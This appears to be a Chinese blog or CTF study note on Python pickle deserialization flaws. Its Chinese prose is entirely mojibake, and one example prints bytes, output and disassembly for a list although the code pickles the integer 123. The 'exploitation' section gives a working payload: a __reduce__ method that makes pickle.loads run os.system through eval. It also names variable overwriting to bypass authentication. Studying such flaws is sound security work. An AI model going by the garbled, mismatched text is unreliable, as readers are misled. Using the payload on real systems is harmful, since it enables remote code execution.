## è®°å½•ä¸€ä¸‹Pickleååºåˆ—åŒ–ï¼Œåªæ€»ç»“æ¼æ´æ–¹é¢çš„ï¼Œä¸è€ƒè™‘å¼€å‘

## ä»‹ç»

åŒ**phpçš„ååºåˆ—åŒ–ç›¸ä¼¼**(ä¸ç„¶ä¸ºä»€ä¹ˆå«ååºåˆ—åŒ–å‘¢ğŸ¤£)ï¼Œpythonä¹Ÿæœ‰åºåˆ—åŒ–ä»¥é•¿æœŸå‚¨å­˜å†…å­˜ä¸­çš„æ•°æ®

pythonä¸­ååºåˆ—åŒ–çš„åº“ä¸»è¦æœ‰ä¸¤ä¸ªï¼Œ`pickle`å’Œ`cPickle`ï¼Œè¿™ä¿©é™¤äº†è¿è¡Œæ•ˆç‡ä¸Šæœ‰åŒºåˆ«å¤–ï¼Œå…¶ä»–æ²¡å•¥åŒºåˆ«
(å½“ç„¶æœ‰yamlï¼Œpythonè¿˜æœ‰æœ‰å¦ä¸€ä¸ªæ›´åŸå§‹çš„åºåˆ—åŒ–åŒ…marshalï¼Œç°åœ¨å¼€å‘æ—¶ä¸€èˆ¬ä½¿ç”¨pickle)

pickleå®é™…ä¸Šå¯ä»¥çœ‹ä½œä¸€ç§**ç‹¬ç«‹çš„è¯­è¨€**ï¼Œé€šè¿‡å¯¹opcodeçš„æ›´æ”¹ç¼–å†™å¯ä»¥æ‰§è¡Œpythonä»£ç ã€è¦†ç›–å˜é‡ç­‰æ“ä½œã€‚ç›´æ¥ç¼–å†™çš„opcodeçµæ´»æ€§æ¯”ä½¿ç”¨pickleåºåˆ—åŒ–ç”Ÿæˆçš„ä»£ç æ›´é«˜ï¼Œæœ‰çš„ä»£ç ä¸èƒ½é€šè¿‡pickleåºåˆ—åŒ–å¾—åˆ°(pickleè§£æèƒ½åŠ›å¤§äºpickleç”Ÿæˆèƒ½åŠ›)

pickleåºåˆ—åŒ–åçš„æ•°æ®ä¸åŒäºjsonå’Œphpåºåˆ—åŒ–ï¼Œæ˜¯**ä¸å¯è¯»çš„**

## ä½¿ç”¨

### å¯åºåˆ—åŒ–çš„å¯¹è±¡

- `None` ã€ `True` å’Œ `False`

- æ•´æ•°ã€æµ®ç‚¹æ•°ã€å¤æ•°

- strã€byteã€bytearray

- åªåŒ…å«å¯å°å­˜å¯¹è±¡çš„é›†åˆï¼ŒåŒ…æ‹¬ tupleã€listã€set å’Œ dict

- å®šä¹‰åœ¨æ¨¡å—æœ€å¤–å±‚çš„å‡½æ•°ï¼ˆä½¿ç”¨ def å®šä¹‰ï¼Œlambda å‡½æ•°åˆ™ä¸å¯ä»¥ï¼‰

- å®šä¹‰åœ¨æ¨¡å—æœ€å¤–å±‚çš„å†…ç½®å‡½æ•°

- å®šä¹‰åœ¨æ¨¡å—æœ€å¤–å±‚çš„ç±»

- `__dict__` å±æ€§å€¼æˆ– `__getstate__()` å‡½æ•°çš„è¿”å›å€¼å¯ä»¥è¢«åºåˆ—åŒ–çš„ç±»(è¯¦è§å®˜æ–¹æ–‡æ¡£çš„Pickling Class Instances)

### åŸºæœ¬å‡½æ•°

> **pickle.dump(obj,file[,protocol])**
>
> åºåˆ—åŒ–å¯¹è±¡ï¼Œå¹¶å°†ç»“æœæ•°æ®æµå†™å…¥åˆ°æ–‡ä»¶å¯¹è±¡ä¸­ï¼Œprotocolå¯é€‰æ‹©æ¨¡å¼ï¼Œé»˜è®¤ä¸º0ï¼Œæ–‡æœ¬å½¢å¼åºåˆ—åŒ–ï¼Œè¿˜å¯ä»¥æ˜¯1æˆ–2ï¼ŒäºŒè¿›åˆ¶å½¢å¼åºåˆ—åŒ–ã€‚
>
> æ³¨ï¼špickle.dumps()å°†å¯¹è±¡objå¯¹è±¡åºåˆ—åŒ–å¹¶è¿”å›ä¸€ä¸ªbyteå¯¹è±¡ï¼Œæ‰€ä»¥ç›´æ¥ç”¨è¿™ä¸ªå‡½æ•°ç”Ÿæˆåæ‰“å°ä¹Ÿæ˜¯ä¸€æ ·çš„

> **pickle.load(file)**
>
> ååºåˆ—åŒ–å¯¹è±¡ã€‚æ³¨æ„è¦è®©pythonæ‰¾åˆ°ç±»çš„å®šä¹‰ï¼Œå¦åˆ™æŠ¥é”™ã€‚
>
> æ³¨ï¼špickle.loads(),ä»å­—èŠ‚å¯¹è±¡ä¸­è¯»å–è¢«å°è£…çš„å¯¹è±¡

> **pickletools.dis(data)**
>
> å¯ä»¥å°†ä¸å¯è¯»çš„åºåˆ—åŒ–å­—èŠ‚è½¬ä¸ºå¯è¯»çš„å½¢å¼

ä¾‹å­

```py
import pickle
import pickletools

a=123
b=pickle.dumps(a)
print(b)
print(pickle.loads(b))
pickletools.dis(b)

b'\x80\x04\x95\x11\x00\x00\x00\x00\x00\x00\x00]\x94(\x8c\x01a\x94\x8c\x01b\x94\x8c\x01c\x94e.'
['a', 'b', 'c']
    0: \x80 PROTO      4
    2: \x95 FRAME      17
   11: ]    EMPTY_LIST
   12: \x94 MEMOIZE    (as 0)
   13: (    MARK
   14: \x8c     SHORT_BINUNICODE 'a'
   17: \x94     MEMOIZE    (as 1)
   18: \x8c     SHORT_BINUNICODE 'b'
   21: \x94     MEMOIZE    (as 2)
   22: \x8c     SHORT_BINUNICODE 'c'
   25: \x94     MEMOIZE    (as 3)
   26: e        APPENDS    (MARK at 13)
   27: .    STOP
highest protocol among opcodes = 4
```

å¯ä»¥çœ‹åˆ°è½¬æ¢æˆäº†æ±‡ç¼–è¯­è¨€ï¼Œè¿™é‡Œå°±ä¸æpickleå…·ä½“æ˜¯æ€æ ·è¿ä½œçš„äº†ï¼Œè¯¦è§[å…ˆçŸ¥ç¤¾åŒº](https://xz.aliyun.com/t/7436)

## æ¼æ´åˆ©ç”¨

**ä»»æ„ä»£ç æ‰§è¡Œæˆ–å‘½ä»¤æ‰§è¡Œã€‚**

**å˜é‡è¦†ç›–ï¼Œé€šè¿‡è¦†ç›–ä¸€äº›å‡­è¯è¾¾åˆ°ç»•è¿‡èº«ä»½éªŒè¯çš„ç›®çš„**

### ç®€å•çš„exp

```py
import pickle
class People(object):
    def __init__(self,name="test"):
        self.name=name
   
    def __reduce__(self):
        return (eval,("__import__('os').system('ls -la')",)) #å‘½ä»¤æ‰§è¡Œ
 
a = People()
c = pickle.dumps(a)
print(c)
pickle.loads(c)
```

ä½†æ˜¯å¾ˆå¤šæ—¶å€™è¿™äº›æ–¹æ³•éƒ½æ˜¯è¢«banäº†çš„ï¼Œæƒ³è¦åšçš„è¯å°±å¾—è‡ªå·±é‡å†™**opcode**ï¼Œç›®å‰åº•å±‚çš„å­¦ä¹ ä¸ç²¾ï¼Œé‡åˆ°é¢˜æˆ–åº•å±‚å­¦å¥½ä¸€ç‚¹äº†å†æ¥å¥½å¥½æ€»ç»“

[ç¾å›¢æ¯easypickle](https://blog.csdn.net/Sapphire037/article/details/126919498)